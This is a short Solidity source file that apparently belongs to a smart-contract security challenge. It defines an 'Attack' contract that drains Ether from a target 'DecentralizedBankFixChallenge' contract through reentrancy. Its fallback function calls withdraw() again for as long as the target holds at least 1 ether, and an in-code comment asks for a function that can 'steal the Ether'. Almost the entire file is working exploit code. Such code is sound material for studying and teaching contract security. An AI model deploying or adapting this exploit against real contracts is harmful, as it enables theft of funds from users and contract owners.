// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./DecentralizedBankFixChallenge.sol";

contract Attack {
    DecentralizedBankFixChallenge public decentralizedBankFixChallenge;

    constructor(address _decentralizedBankFixChallengeAddress) {
        decentralizedBankFixChallenge = DecentralizedBankFixChallenge(
            _decentralizedBankFixChallengeAddress
        );
    }

    // Please develope a function that can steal the Ether from DecentralizedBanktoAttack.
    fallback() external payable {
        if (address(decentralizedBankFixChallenge).balance >= 1 ether) {
            decentralizedBankFixChallenge.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        decentralizedBankFixChallenge.deposit{value: 1 ether}();
        decentralizedBankFixChallenge.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
